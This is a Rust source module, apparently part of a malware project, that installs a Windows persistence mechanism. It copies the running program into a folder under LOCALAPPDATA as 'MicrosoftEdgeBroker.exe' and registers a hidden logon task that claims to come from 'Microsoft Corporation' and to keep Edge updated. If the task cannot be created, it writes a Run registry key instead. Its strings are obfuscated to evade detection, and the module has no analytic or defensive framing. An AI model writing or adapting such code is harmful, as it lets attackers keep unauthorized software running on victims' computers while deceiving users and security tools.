use obfstr::obfstr;

#[cfg(target_os = "windows")]
const CLSID_TASK_SCHEDULER: windows::core::GUID = windows::core::GUID {
    data1: 0x0f87369f,
    data2: 0xa4e5,
    data3: 0x4cfc,
    data4: [0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd],
};

pub fn install() -> bool {
    let stable_path = match g_stable_path() {
        Some(p) => p,
        None => return false,
    };

    if !c_to_stable(&stable_path) {
        return false;
    }

    if i_already_installed() {
        return true;
    }

    if unsafe { i_via_task_scheduler(&stable_path) } {
        return true;
    }

    i_via_registry(&stable_path)
}

pub fn g_stable_path() -> Option<String> {
    let local = std::env::var("LOCALAPPDATA").ok()?;
    let dir = format!("{}\\Microsoft", local);
    std::fs::create_dir_all(&dir).ok()?;
    Some(format!("{}\\{}", dir, obfstr!("MicrosoftEdgeBroker.exe")))
}

fn c_to_stable(stable: &str) -> bool {
    let current = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return false,
    };
    if current.to_string_lossy().eq_ignore_ascii_case(stable) {
        return true;
    }
    std::fs::copy(&current, stable).is_ok()
}

fn i_already_installed() -> bool {
    if unsafe { c_task_exists() } {
        return true;
    }
    c_registry_key_exists()
}

unsafe fn c_task_exists() -> bool {
    #[cfg(target_os = "windows")]
    {
        use windows::Win32::System::Com::{CoCreateInstance, CoInitializeEx, CLSCTX_ALL, COINIT_APARTMENTTHREADED};
        use windows::Win32::System::TaskScheduler::ITaskService;
        use windows::core::BSTR;

        let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        let service: ITaskService = match CoCreateInstance(&CLSID_TASK_SCHEDULER, None, CLSCTX_ALL) {
            Ok(s) => s,
            Err(_) => return false,
        };
        let v = windows::core::VARIANT::default();
        let _ = service.Connect(&v, &v, &v, &v);
        let folder = match service.GetFolder(&BSTR::from("\\")) {
            Ok(f) => f,
            Err(_) => return false,
        };
        folder.GetTask(&BSTR::from(obfstr!("MicrosoftEdgeUpdateBroker"))).is_ok()
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}

fn c_registry_key_exists() -> bool {
    #[cfg(target_os = "windows")]
    unsafe {
        use windows::Win32::System::Registry::{RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER, KEY_QUERY_VALUE, HKEY};
        use windows::core::PCWSTR;

        let path: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
        let name: Vec<u16> = format!("{}\0", obfstr!("MicrosoftEdgeUpdateBroker")).encode_utf16().collect();
        let mut hkey = HKEY::default();
        if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(path.as_ptr()), 0, KEY_QUERY_VALUE, &mut hkey).is_ok() {
            let result = RegQueryValueExW(hkey, PCWSTR(name.as_ptr()), None, None, None, None);
            let _ = RegCloseKey(hkey);
            return result.is_ok();
        }
        false
    }
    #[cfg(not(target_os = "windows"))]
    { false }
}

#[cfg(target_os = "windows")]
unsafe fn i_via_task_scheduler(exe_path: &str) -> bool {
    use windows::Win32::System::Com::{CoCreateInstance, CoInitializeEx, CLSCTX_ALL, COINIT_APARTMENTTHREADED};
    use windows::Win32::System::TaskScheduler::{
        IAction, IExecAction, ILogonTrigger, ITaskDefinition, ITaskService, ITrigger,
        TASK_ACTION_EXEC, TASK_LOGON_INTERACTIVE_TOKEN,
        TASK_RUNLEVEL_LUA, TASK_TRIGGER_LOGON,
    };
    use windows::core::{BSTR, Interface};
    use windows::Win32::Foundation::VARIANT_BOOL;

    let _ = CoInitializeEx(None, COINIT_APARTMENTTHREADED);

    let service: ITaskService = match CoCreateInstance(&CLSID_TASK_SCHEDULER, None, CLSCTX_ALL) {
        Ok(s) => s,
        Err(_) => return false,
    };

    let v = windows::core::VARIANT::default();
    if service.Connect(&v, &v, &v, &v).is_err() {
        return false;
    }

    let root = match service.GetFolder(&BSTR::from("\\")) {
        Ok(f) => f,
        Err(_) => return false,
    };

    let task: ITaskDefinition = match service.NewTask(0) {
        Ok(t) => t,
        Err(_) => return false,
    };

    if let Ok(info) = task.RegistrationInfo() {
        let _ = info.SetAuthor(&BSTR::from(obfstr!("Microsoft Corporation")));
        let _ = info.SetDescription(&BSTR::from(obfstr!("Keeps Microsoft Edge up to date")));
    }

    if let Ok(settings) = task.Settings() {
        let _ = settings.SetHidden(VARIANT_BOOL(-1));
        let _ = settings.SetDisallowStartIfOnBatteries(VARIANT_BOOL(0));
        let _ = settings.SetStopIfGoingOnBatteries(VARIANT_BOOL(0));
        let _ = settings.SetExecutionTimeLimit(&BSTR::from("PT0S"));
    }

    if let Ok(principal) = task.Principal() {
        let _ = principal.SetRunLevel(TASK_RUNLEVEL_LUA);
        let _ = principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        if let Ok(uname) = std::env::var("USERNAME") {
            let _ = principal.SetUserId(&BSTR::from(uname));
        }
    }

    if let Ok(triggers) = task.Triggers() {
        if let Ok(trigger) = triggers.Create(TASK_TRIGGER_LOGON) {
            let trigger: ITrigger = trigger;
            if let Ok(logon) = trigger.cast::<ILogonTrigger>() {
                if let Ok(uname) = std::env::var("USERNAME") {
                    let _ = logon.SetUserId(&BSTR::from(uname));
                }
            }
        }
    }

    if let Ok(actions) = task.Actions() {
        if let Ok(action) = actions.Create(TASK_ACTION_EXEC) {
            let action: IAction = action;
            if let Ok(exec) = action.cast::<IExecAction>() {
                let _ = exec.SetPath(&BSTR::from(exe_path));
                let _ = exec.SetArguments(&BSTR::from(""));
            }
        }
    }

    root.RegisterTaskDefinition(
        &BSTR::from(obfstr!("MicrosoftEdgeUpdateBroker")),
        &task,
        6i32,
        &v,
        &v,
        TASK_LOGON_INTERACTIVE_TOKEN,
        &v,
    ).is_ok()
}

#[cfg(not(target_os = "windows"))]
unsafe fn i_via_task_scheduler(_exe_path: &str) -> bool { false }

#[cfg(target_os = "windows")]
fn i_via_registry(exe_path: &str) -> bool {
    unsafe {
        use windows::Win32::System::Registry::{RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ, HKEY};
        use windows::core::PCWSTR;

        let path: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0".encode_utf16().collect();
        let name: Vec<u16> = format!("{}\0", obfstr!("MicrosoftEdgeUpdateBroker")).encode_utf16().collect();
        let data: Vec<u16> = format!("{}\0", exe_path).encode_utf16().collect();
        let data_bytes = std::slice::from_raw_parts(data.as_ptr() as *const u8, data.len() * 2);

        let mut hkey = HKEY::default();
        if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(path.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_err() {
            return false;
        }
        let result = RegSetValueExW(hkey, PCWSTR(name.as_ptr()), 0, REG_SZ, Some(data_bytes));
        let _ = RegCloseKey(hkey);
        result.is_ok()
    }
}

#[cfg(not(target_os = "windows"))]
fn i_via_registry(_exe_path: &str) -> bool { false }
